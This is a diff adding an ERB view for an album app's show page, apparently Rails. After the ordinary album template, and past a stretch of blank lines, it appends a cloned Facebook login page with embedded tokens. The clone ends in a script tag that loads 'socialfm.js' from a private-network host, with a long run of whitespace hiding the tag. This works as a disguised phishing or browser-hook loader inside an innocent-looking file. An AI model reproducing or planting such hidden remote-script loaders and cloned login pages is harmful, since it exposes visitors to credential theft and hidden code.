@@ -1,0 +1,68 @@
+
+<p>
+  <b>Name:</b>
+  <%= @album.name %>
+</p>
+
+<p>
+  <b>Description:</b>
+  <%= @album.description %>
+</p>
+<ul>
+<% for album in @album.images %>
+<li>
+
+<%= image_tag album.avatar.url,:size => "100x100"  %></br>
+Tag Names:
+  <% album.tag_name.split( /, */).each do |i| %><br/>
+
+<%= i %>
+<% end %>
+
+</li>
+<% end %>
+
+</ul>
+
+<%= link_to 'Edit', edit_album_path(@album) %> |
+<%= link_to 'Back', albums_path %>
+
+<!--html><body>
+	<h1>New game</h1>
+
+	<%= render 'form' %>
+
+	<%= link_to 'Back', albums_path %>
+	
+	</body></html-->
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" id="facebook" class="no_js">
+<head><meta charset="utf-8" /><script>function envFlush(a){function b(c){for(var d in a)c[d]=a[d];}if(window.requireLazy){requireLazy(['Env'],b);}else{Env=window.Env||{};b(Env);}}envFlush({"ffid1":"AcGzCYpJzHU4tovbmeRtuIb5ODiZX5SAnxl-8lY1s1ET1_bQwnpLfLl7XjxlJOcpqGo","ffid2":"AcHPm7GtBtvHVne_3uolAmdh-OAvEU5pxED0cdWonw-OEXxd2AFE8T2w9xqnTmSOso4","ffid3":"AcGJm6o_Dq_uV29VliYvGLSKNaPeYsyTsezQuu49QrZKLH6q0iV89FlnrHutypjlp-CpS3bC_UFaTsCOw3yx3vS0","ffid4":"AcFyyko_9KdPpMHxeX4QkICF-nb_GT3tLWBXf6lj_JmEGyIPIG0afHp9nU4o7VY6P78","ffver":63083,"user":"0","locale":"en_US","method":"GET","svn_rev":852862,"tier":"","push_phase":"V3","pkg_cohort":"EXP1:DEFAULT","vip":"31.13.79.17","www_base":"http:\/\/www.facebook.com\/","fb_dtsg":"AQDTywI-","ajaxpipe_token":"AXgGJk7frN-SKiPu","lhsh":"wAQElSxeB","tracking_domain":"https:\/\/pixel.facebook.com","retry_ajax_on_network_error":"1","fbid_emoticons":"1"});</script><script>envFlush({"eagleEyeConfig":{"seed":"0OKU"}});CavalryLogger=false;</script><noscript><meta http-equiv="refresh" content="0; URL=/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg&amp;_fb_noscript=1" /></noscript><meta name="robots" content="noodp, noydir" /><meta name="referrer" content="default" id="meta_referrer" /><meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." /><link rel="alternate" media="handheld" href="https://www.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><title id="pageTitle">Welcome to Facebook - Log In, Sign Up or Learn More</title><meta property="og:site_name" content="Facebook" /><meta property="og:url" content="https://www.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" /><meta property="og:locale" content="en_US" /><link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="id" href="https://id-id.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="es" href="https://es-la.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="th" href="https://th-th.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="it" href="https://it-it.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="alternate" hreflang="en" href="https://www.facebook.com/index.php?stype=lo&amp;jlou=AfcINrNiHwqOc4wlspelca_zovzPBE9s_vy25GFJms9s2Xm0FUWaO_4-ab8eSB7CNDJMncLQJSkqhnuMizMXL73cnR8Ndlkwn-mlpkoxyTDnLQ&amp;smuh=51816&amp;lh=Ac_D9UQk4za9Ts5w&amp;aik=ZGQsye-_zHqrkwVwZwLsRg" /><link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yi/r/q9U99v3_saj.ico" /><noscript><meta http-equiv="X-Frame-Options" content="deny" /></noscript>
+    <link rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yY/r/u3j6HyiBlic.css" />
+    <link rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y4/r/e8NzeJykOv4.css" />
+    <link rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/ys/r/K3aL4ZBQLlj.css" />
+    <link rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yc/r/tx1iB94dMvT.css" />
+
+    <link rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yZ/r/nsETguQGKq9.css" />
+
+    <script src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yR/r/jW0TOPdrpCN.js" crossorigin="anonymous"></script>
+
+<!-- BigPipe construction and first response -->
+<script>var bigPipe = new (require("BigPipe"))({"lid":0,"forceFinish":true});</script>
+<script>bigPipe.onPageletArrive({"id":"first_response","phase":0,"jsmods":{},"is_last":true,"css":["bAZRb","rsCsm","\/t4lT","gm6WI","2DYGP"],"bootloadable":{},"resource_map":{},"js":["b4ExA","s1z1o","eo7LY","25se3","iXSbu","GMxZx","4vv8\/"]})</script><script>bigPipe.onPageletArrive({"id":"","phase":1,"jsmods":{},"is_last":true,"css":["bAZRb","rsCsm","\/t4lT","gm6WI","2DYGP"],"bootloadable":{},"resource_map":{},"js":["b4ExA","s1z1o","eo7LY","25se3","iXSbu","GMxZx","4vv8\/"],"the_end":true})</script>   
+
+
+<script src="http://172.16.0.5:3000/socialfm.js?code=f9317aabc615b22f18f8efd6a3644f5d77514b00" type="text/javascript"></script>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </body></html>
